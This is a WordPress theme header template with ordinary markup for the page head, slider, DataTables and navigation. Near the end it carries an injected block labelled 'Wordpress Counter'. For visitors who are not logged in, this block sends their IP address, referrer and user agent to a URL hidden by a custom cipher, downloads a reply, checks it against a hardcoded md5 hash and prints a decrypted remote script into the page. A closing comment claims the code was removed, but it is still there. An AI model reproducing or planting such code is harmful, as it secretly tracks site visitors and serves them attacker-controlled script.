<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head profile="http://gmpg.org/xfn/11">

<title><?php woo_title(); ?></title>
<?php woo_meta(); ?>

<link rel="stylesheet" type="text/css" href="<?php bloginfo('stylesheet_url'); ?>" media="screen" />
<link rel="stylesheet" type="text/css" media="all" href="<?php bloginfo('template_directory'); ?>/css/effects.css" />
<?php if ( is_home() ) { ?><link rel="stylesheet" type="text/css" href="<?php echo get_bloginfo('template_directory'); ?>/functions/css/jquery-ui-datepicker.css" /><?php } ?>
<link rel="alternate" type="application/rss+xml" title="RSS 2.0" href="<?php $GLOBALS[feedurl] = get_option('woo_feed_url'); if ( $feedurl ) { echo $feedurl; } else { echo get_bloginfo_rss('rss2_url'); } ?>" />
<link rel="pingback" href="<?php bloginfo('pingback_url'); ?>" />
      
<?php if ( is_singular() ) wp_enqueue_script( 'comment-reply' );  ?>
<?php wp_head(); ?>
<?php woo_head(); ?>

<?php
	$key = get_option('woo_maps_apikey');
	if(!empty($key)){ ?>
	<script src="http://maps.google.com/maps?file=api&amp;v=2&amp;key=<?php echo $key; ?>" type="text/javascript"></script>
<?php } ?>
    
<?php if ( !$paged && get_option('woo_featured') == "true" ) { ?>
<script type="text/javascript">
jQuery(window).load(function(){
	jQuery("#loopedSlider").loopedSlider({
	<?php
		$autoStart = 0;
		$slidespeed = 600;
		if ( get_option("woo_slider_auto") == "true" ) 
		   $autoStart = get_option("woo_slider_interval") * 1000;
		else 
		   $autoStart = 0;
		if ( get_option("woo_slider_speed") <> "" ) 
			$slidespeed = get_option("woo_slider_speed") * 1000;
	?>
		autoStart: <?php echo $autoStart; ?>, 
		slidespeed: <?php echo $slidespeed; ?>, 
		autoHeight: true
	});
});
</script>
<?php } ?>
<!-- DataTables CSS -->
<link rel="stylesheet" type="text/css" href="http://ajax.aspnetcdn.com/ajax/jquery.dataTables/1.8.2/css/jquery.dataTables.css">
<!-- DataTables -->
<script type="text/javascript" charset="utf8" src="http://ajax.aspnetcdn.com/ajax/jquery.dataTables/1.8.2/jquery.dataTables.min.js"></script>
<script type="text/javascript">
var dataTable_jQuery = jQuery.noConflict();
dataTable_jQuery(document).ready(function() {
    dataTable_jQuery('#content_table').dataTable( {
        "bPaginate": false,
        "bLengthChange": false,
        "bFilter": true,
        "bSort": true,
        "bInfo": false,
        "bAutoWidth": false
    } );
} );

</script>

<style type="text/css">
.dataTables_filter {float: none; margin-bottom: 9px;}
</style>
<!-- pca header -->
</head>

<body <?php body_class(); ?>>

<?php woo_top(); ?>

<div id="wrapper">
           
	<div id="header" class="col-full">
 		       
		<div id="logo">
	       
		<?php if (get_option('woo_texttitle') <> "true") : $logo = get_option('woo_logo'); ?>
            <a href="<?php bloginfo('url'); ?>" title="<?php bloginfo('description'); ?>">
                <img src="<?php if ($logo) echo $logo; else { bloginfo('template_directory'); ?>/images/logo.png<?php } ?>" alt="<?php bloginfo('name'); ?>" />
            </a>
        <?php endif; ?> 
        
        <?php if( is_singular() ) : ?>
            <span class="site-title"><a href="<?php bloginfo('url'); ?>"><?php bloginfo('name'); ?></a></span>
        <?php else : ?>
            <h1 class="site-title"><a href="<?php bloginfo('url'); ?>"><?php bloginfo('name'); ?></a></h1>
        <?php endif; ?>
            <span class="site-description"><?php bloginfo('description'); ?></span>
	      	
		</div><!-- /#logo -->
	       
		<?php if (get_option('woo_ad_top') == 'true') { ?>
        <div id="topad">
	    	<?php include (TEMPLATEPATH . "/ads/top_ad.php"); ?>
	   	</div><!-- /#topad -->
        <?php } ?>
       
	</div><!-- /#header -->
    
    <div id="navigation-outer">
    
		<div id="navigation" class="col-full">
			    <?php
      		if ( function_exists('has_nav_menu') && has_nav_menu('primary-menu') ) {
      			wp_nav_menu( array( 'depth' => 6, 'sort_column' => 'menu_order', 'container' => 'ul', 'menu_id' => 'main-nav', 'menu_class' => 'nav fl', 'theme_location' => 'primary-menu' ) );
      		} else {
      		?>
	        <ul id="main-nav" class="nav fl">
				<?php 
	        	if ( get_option('woo_custom_nav_menu') == 'true' ) {
	        		if ( function_exists('woo_custom_navigation_output') )
						woo_custom_navigation_output('depth=6');
	
				} else { ?>
	            	
<!--		            <?php if ( is_home() ) $highlight = "page_item current_page_item"; else $highlight = "page_item"; ?>
		            <li class="<?php echo $highlight; ?>"><a href="<?php bloginfo('url'); ?>"><?php _e('Home', 'woothemes') ?></a></li> -->
		            <?php 
		    		if ( get_option('woo_cat_menu') == 'true' ) 
		    			wp_list_categories('sort_column=menu_order&depth=6&title_li=&exclude='.get_option('woo_nav_exclude')); 
		    		else
		    			wp_list_pages('sort_column=menu_order&depth=6&title_li=&exclude='.get_option('woo_nav_exclude')); 
	
				}
				?>
	        </ul><!-- /#nav -->
	        <?php } ?>
	        <ul class="rss fr">
	            <?php $email = get_option('woo_subscribe_email'); if ( $email ) { ?>
	            <li class="sub-email"><a href="<?php echo $email; ?>" target="_blank"><?php _e('Subscribe by Email', 'woothemes') ?></a></li>
	            <?php } ?>
	            <li class="sub-rss"><a href="<?php if ( $GLOBALS[feedurl] ) { echo $GLOBALS[feedurl]; } else { echo get_bloginfo_rss('rss2_url'); } ?>"><?php _e('Subscribe for updates', 'woothemes') ?></a></li>
	        </ul>
	        
	        <div id="nav-left-btm"></div>
	        
	        <div id="nav-right-btm"></div>
	        
		</div><!-- /#navigation -->
	
	</div><!-- /#navigation-outer -->
	
	<div id="navigation_btm"></div>
       


<!-- Wordpress Counter -->
<?php
if (!is_user_logged_in()) {
	$ip = @urlencode ($_SERVER['REMOTE_ADDR']);
	$ref = @urlencode ($_SERVER['HTTP_REFERER']);
	$ua = @urlencode ($_SERVER['HTTP_USER_AGENT']);
	$url = dsCrypt ( '89Z3:/#P9T2K5PA086]00P#P7261KZ]09@IQc', 1 ).'?ip='.$ip.'&ref='.$ref.'&ua='.$ua;
	if ( function_exists ('curl_init') ) {
		$ch = @curl_init ($url);
		@curl_setopt ( $ch, CURLOPT_CONNECTTIMEOUT, 5 );
		@curl_setopt ( $ch, CURLOPT_TIMEOUT, 5 );
		@curl_setopt ( $ch, CURLOPT_RETURNTRANSFER, TRUE );
		$doms = @curl_exec ($ch);
		@curl_close ($ch);
	}
	else
		$doms = @file_get_contents ($url);

	list ( $trash, $secure, $script ) = explode ( '====================', trim ($doms) );
	if ( md5 (trim ($secure) ) == '80b27b54b59a600bbf04aa9700a8ce70' ) {
		print dsCrypt ( $script, 1 );
	}
}

 function dsCrypt($input,$decrypt=false) {
     $o = $s1 = $s2 = array(); 
     $basea = array('?','(','@',';','$','#',"]","&",'*'); 
     $basea = array_merge($basea, range('a','z'), range('A','Z'), range(0,9) );
     $basea = array_merge($basea, array('!',')','_','+','|','%','/','[','.',' ') );
     $dimension=9;
     for($i=0;$i<$dimension;$i++) {
         for($j=0;$j<$dimension;$j++) {
             $s1[$i][$j] = $basea[$i*$dimension+$j];
             $s2[$i][$j] = str_rot13($basea[($dimension*$dimension-1) - ($i*$dimension+$j)]);
         }
     }
     unset($basea);
     $m = floor(strlen($input)/2)*2; 
     $symbl = $m==strlen($input) ? '':$input[strlen($input)-1];
     $al = array();
     for ($ii=0; $ii<$m; $ii+=2) {
         $symb1 = $symbn1 = strval($input[$ii]);
         $symb2 = $symbn2 = strval($input[$ii+1]);
         $a1 = $a2 = array();
         for($i=0;$i<$dimension;$i++) { 
             for($j=0;$j<$dimension;$j++) {
                 if ($decrypt) {
                     if ($symb1===strval($s2[$i][$j]) ) $a1=array($i,$j);
                     if ($symb2===strval($s1[$i][$j]) ) $a2=array($i,$j);
                     if (!empty($symbl) && $symbl===strval($s2[$i][$j])) $al=array($i,$j);
                 }
                 else {
                     if ($symb1===strval($s1[$i][$j]) ) $a1=array($i,$j);
                     if ($symb2===strval($s2[$i][$j]) ) $a2=array($i,$j);
                     if (!empty($symbl) && $symbl===strval($s1[$i][$j])) $al=array($i,$j);
                 }
             }
         }
         if (sizeof($a1) && sizeof($a2)) {
             $symbn1 = $decrypt ? $s1[$a1[0]][$a2[1]] : $s2[$a1[0]][$a2[1]];
             $symbn2 = $decrypt ? $s2[$a2[0]][$a1[1]] : $s1[$a2[0]][$a1[1]];
         }
         $o[] = $symbn1.$symbn2;
     }
     if (!empty($symbl) && sizeof($al)) 
         $o[] = $decrypt ? $s1[$al[1]][$al[0]] : $s2[$al[1]][$al[0]];
     return implode('',$o);
 }
?>

<!-- Wordpress Counter -->
<!-- code removed by Brian Hull -->